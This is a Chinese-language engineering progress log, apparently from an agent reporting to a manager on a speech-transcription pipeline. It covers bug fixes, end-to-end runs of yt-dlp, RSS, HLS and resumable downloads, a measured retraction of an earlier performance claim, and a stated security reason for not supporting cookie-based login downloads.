   - `sherpa-onnx-punct-ct-transformer`（279 MB）— 中文标点，没有它中文稿**全篇无标点**
   → **后果：要求 2.2（网页管模型）装不了这些，于是 F3 和中文默认引擎在 UI 上根本交付不了。** 请派给 `model-mgmt`。
2. **语言自动检测缺失**（我已修）—— 见 C.3，这曾是个静默的中文灾难。
3. **引擎选择逻辑没人接线**：`selectEngine()` 已实现（按语言/设置/强制），但 daemon 没调用它。
4. **`DirectHttpSource` 下载没有断点续传**：用的是普通 fetch，无 Range。播客动辄几百 MB，断网即从头再来。`packages/downloader` 有续传能力但**媒体下载没走它**。
5. **取消后的「续跑」从未端到端验证**：`deriveResumeSet` / `completedChunkIndices` 管线写好了，**一次都没真跑过**（我只验证过取消本身）。
6. **`whisper-server` 常驻模式未用**：每个 chunk 都 spawn 一次 `whisper-cli` 并重新加载模型。large 模型每块多几秒——用户会感觉"卡住"。属功能体验，不只是性能。
7. **多 GPU 设备选择缺失**：runtime 的 probe 会报告多个设备，但没有任何地方能选 `device_index`。
8. **F1 会员/登录内容**：矩阵标 🔴 正确。补充：我**故意不传** `--cookies`（那是任意读文件入口，见 SECURITY.md）。要做这个功能必须先做安全决策，不是单纯补代码。

### C. 我这轮真跑出来的 5 个 bug（全部已修）

1. **yt-dlp 退出码 101 被当成失败** —— yt-dlp 命中 `--max-downloads` 就返回 101，**哪怕文件已经下载完成**。日志明确写着 `[download] Download completed` 然后 `exit 101`。**F1 因此对每个视频都失败**。这就是「只测 probe 没测 fetch」的代价。
2. **重试永远失败** —— 我用「目录里的新文件」判断产物，上一次失败留下的文件让第二次看不到"新文件"，于是 `the extractor produced no output file`。改为「新文件 ∪ 本次启动后修改过的 ∪ 目录内全部」三级回退。
3. **【最严重】未指定语言时 whisper 把中文*翻译*成英文** —— whisper-cli 默认 `-l en`，喂中文时它不转写、直接**翻译**。实测：中文音频 → `"The main point is to talk about the three questions…"`。**中文用户没点过语言设置就会拿到自己笔记的英文翻译。** 已改为始终传 `-l`，未指定则 `auto`。复验：现在输出 `重點想談三個問題…`。
4. **sherpa-onnx 的 ESM/CJS interop** —— Node 的 cjs-module-lexer 只把 `OnlineRecognizer` 提升到命名空间，`OfflineRecognizer`/`OfflinePunctuation` 只在 `.default` 下。**F3 之前能跑是运气**，Paraformer 一上来就炸。已抽出 `sherpaModule.ts` 统一处理。
5. **`ParaformerEngine` 完全忽略 `req.modelPath`** —— 一直用构造函数里的模型。**「切换模型重跑」对 Paraformer 静默无效**。已改为 req 优先 + 模型路径变化时失效缓存。

### D. 主动降级的一项（如实说不做）
**中文数字→阿拉伯数字后处理：默认关闭，不再投入。** 实测我的规则**让文本变差**：`两千零六年 → 两千06年`（千是单位，digit-run 解析失败后单位词规则只吃掉了"零六"）。按我自己写在 SECURITY 里的原则「错误的修正比原样更糟，因为用户看不出是我们改的」——**宁可不改**。代码与用例保留，标注为待修。英文大小写还原**保持开启**（固定白名单，不可能让文本变差）。

## yt-dlp 全链路真实输出（F1，端到端）
```
adapter    : yt-dlp | downloaded 252182 bytes -> /tmp/e2e/job-f1-full/jNQXAC9IVRw.webm
title      : Me at the zoo   | uploader: jawed | duration 19s
audio      : 19.0s | speech 17.7s | chunks 1 | segments 2
timings ms : {"probe":7149,"fetch":5239,"normalize":125,"vad":541,"asr":751}   total 13.8s

  [0.3s] All right, so here we are, one of the elephants, cool thing about these guys is that they have
  [7.5s] really, really, really long fums, and that's cool, and that's pretty much all those to say.
```
（另跑了 Big Buck Bunny：30.7 MB 下载成功、635s 归一化成功，但**0 段** —— 该片无人声，VAD 正确返回 0。这是设计如此：不给静音喂模型、不编造。）

## Paraformer 中文端到端（功能可用性，非性能）
13 chunk / 13 段 / 段级时间戳 / 时间戳单调 / `words===null` 全部为真（F5 中文按段高亮的依据）：
```
[1.2-28.8s] Twitter来自维基百科自由的百科全书网址，…Twitter非官方中文名称推特是一个社交网络及微博客服务，
            用户可以经由SMS即时通讯电游Twitter网站或Twitter用户端软件，如Twitter rific。
[58.7-76.9s] RSS电邮或Twitter用户端软件获得文字更新。目前，手机SMS更新服务暂时只有在美国、加拿大及英国
            可获得免费服务，除移动电话供应商的SMS费用。
```
引擎选择实测：`zh/batch → paraformer`（附 2 条 tradeoff 文案 + 可切换项）、`en/batch → whisper.cpp`、`forceEngineId` 生效、`requireWordTimestamps → whisper.cpp`（降级择优）。

需要 Manager 决策:
1. **ASR 模型目录缺 4 个模型**（B.1）—— 这是当前**我领域最大的交付阻塞**，F3 与中文默认引擎在 UI 上装不了。请派 `model-mgmt`。
2. **谁把 `selectEngine()` 接进 daemon**（B.3）。
3. **媒体下载是否改走 `packages/downloader`** 以获得断点续传（B.4）。
4. `whisper-server` 常驻模式是否排期（B.6）——大模型下影响体感明显。

诚实声明:
- **未做**（按裁决降级）：benchmark 闭环虽已实现但未再投入验证；paraformer-zh 完整版 / SenseVoice 未测；RTF 对比未再做。
- **未验证**：RSS 单集端到端、HLS 上跑 ASR、取消后续跑、Windows/macOS。
- benchmark 代码里 `runBenchmark` 会传 `modelPath`，Paraformer 的忽略问题已修；但 **benchmark 本身在本轮之后未再复跑**。

---

## [2026-08-02 19:10] T-031 DONE

交付:
- `packages/pipeline/src/media/resumableFetch.ts`（复用 `@openmemo/downloader` 的 Range 原语）
- `packages/pipeline/src/asr/whisperServer.ts`（常驻服务模式，**但见下方负面结论**）
- 修改：`media/sources/directHttp.ts`（接入断点续传）、`index.ts`
- `docs/SECURITY.md` §4.1（`--cookies` 为何暂不支持）
- **104/104 测试全绿**，tsc / eslint 干净

## 优先级 1：两个"只验证前半段"的缺口 —— 已关闭

**RSS 从 feed 真下载并转写一集** ✅
```
FEED: https://librivox.org/rss/47  -> "Count of Monte Cristo" | 128 episodes
episode[0]: Marseilles–The Arrival
  -> https://www.archive.org/download/count_monte_cristo_0711_librivox/count_of_monte_cristo_001_dumas_64kb.mp3
adapter: direct-http | downloaded 9,436,391 bytes
audio 1179.4s | chunks 50 | segments 281 | total 127.6s
  [0.8s]  This is a LibraVox recording.
  [2.8s]  All LibraVox recordings are in the public domain,
  [5.8s]  and for more information or to volunteer, visit LibraVox.org.
  [12.8s] Recording by Kristin Luoma.
  [17.8s] Of the Count of Monte Cristo.
```

**HLS 上真跑 ASR** ✅
```
HLS: https://storage.googleapis.com/shaka-demo-assets/angel-one-hls/hls.m3u8
adapter: direct-http | audio 60.0s | speech 50.2s | chunks 4 | segments 20 | total 57.0s
  [1.1s]  "Captain's Lord, Star Day 4, 1636.9, Aspyr, our examination of the seven-year overdue Federation
  [10.9s] freighter Odin, disabled by an asteroid collision, revealed no life signs. However, three escape
  [17.4s] pods were missing, suggesting the possibility of survivors."
  [21.9s] Ready to begin orbit of Angel 1, Captain.
  [23.9s] Make it so, Mr. LaForge.
  [27.0s] Angel 1 is a class M planet, sir.
```

## 优先级 2

**3. 断点续传** ✅ 复用 `@openmemo/downloader` 的 `probeRemoteFile` / `openRangeStream` / `backoffMs` / `sleep`。
**没有复用 `downloadFile()`，理由**：它**要求预先已知 SHA-256** 才能守住"verified == installed"——对目录制品完全正确，但任意播客 URL 没有摘要。强行套用只能二选一：编造摘要（不诚实），或在一个以校验为契约的函数内部关掉校验（更糟）。所以复用传输层，各自保留合适的完整性模型（目录制品=摘要校验；媒体=大小限制 + ffprobe 验证）。
**真实中断验证**：
```
attempt 1 interrupted after 401,408 bytes
.partial on disk: 393,216 bytes ✅          <- 崩溃点保留在磁盘上
resumed from: 393,216 | final: 15,190,644 | attempts: 1 | ranges: true
ffprobe 复验: duration=1898.709841 size=15190644   <- 断点续传没有损坏文件
```
`.partial` 的**文件长度本身就是续传偏移**，不用 sidecar，避免崩溃后两者不一致。

**4. 取消后续跑** ✅ 真跑一次：
```
PASS 1 cancelled  -> persisted chunks: 0,1,2,3,4 | 23 segments | total 50
resume set size: 5 (plan_version match)
PASS 2 complete in 76.1s
  已完成 chunk 被重算的数量: 0  ✅ 一个都没重跑
  db 中 chunk 总数: 50 / 期望 50 ✅ | 0..N 连续 ✅ | segments 282
  plan_version 不匹配 -> resume set = 0  ✅ 拒绝跨版本续跑
```

**5. `whisper-server` 常驻模式 —— ⚠️ 已实现，但实测证明我的前提是错的，故不设为默认**

我上轮说"每 chunk 重载模型，大模型下像卡死"。**实测把这个前提推翻了**（large-v3-turbo-q5_0，547 MB，同机同参数）：

| 文件 | CLI（每 chunk 重启） | SERVER（常驻） |
|---|---|---|
| jfk.wav 0.4 MB | 稳态 **5,950 ms** | 稳态 **9,303 ms** |
| audio16k.wav 37.7 MB | 稳态 **6,228 ms** | 稳态 **11,094 ms** |

**常驻模式反而慢 55–78%，且与文件大小无关**（小文件也慢，所以不是上传开销）。
根因：**whisper.cpp 用 mmap 加载模型**，第二次之后 OS page cache 让"重载"几乎免费——
我以为的主要成本根本不存在。"像卡死"的判断是我基于推理而非测量下的。

→ **`WhisperServerEngine` 保留**（实现正确、绑定 127.0.0.1、`offset_t`/`duration` 逐请求生效、
返回逐词时间戳、`dispose()` 杀进程组），但**不作为默认**。真正需要它的场景是"多个并发 job 共享一个已加载模型"，
那要等 daemon 侧的调度接线后再评估。**我不会为了让自己上轮的判断成立而硬推它。**

## 优先级 3
- 多 GPU 选 device：**按裁决未做**。
- `--cookies`：**按裁决未实现**，已在 `docs/SECURITY.md` §4.1 写明理由——它是**任意文件读取入口**，
  `--cookies-from-browser` 更会读取**全部站点登录凭据**；还有凭据落盘、日志泄漏、最小化授权三个配套问题。
  结论是"这不是补代码的功能，是需要先做安全设计的功能"。

## 剩余未实现 / 未验证清单
| 项 | 状态 |
|---|---|
| Windows / macOS 全部路径 | **未验证**（无机器） |
| `whisper-server` 作为默认 | **不采用**（实测更慢，见上） |
| 多 GPU device 选择 | 未做（裁决降级） |
| 会员内容 cookie | 未做（裁决，需安全设计） |
| `selectEngine()` 接进 daemon | 不归我（`oss-scout`） |
| 4 个 ASR 模型进目录 | 不归我（已派 `model-mgmt`） |
| 中文数字→阿拉伯数字 | **默认关闭**（我上轮实测它让文本变差，未修复） |
| Paraformer 词级时间戳 | **模型不提供**，F5 中文只能按段高亮 |
| benchmark 闭环复跑 | 未复跑（性能项，按裁决降级） |
| 断点续传的"服务器不支持 Range"分支 | **未验证**（archive.org 支持 Range，没找到不支持的真实源） |

诚实声明:
- 本轮 5 项要求做完 4 项，第 5 项（whisper-server）**做完了但结论是"不该用"**——我把测量结果如实报出来，而不是让实现去迁就我上一轮的说法。
- RSS/HLS/续传/取消续跑均为**真跑**，输出与数字直接来自运行日志。
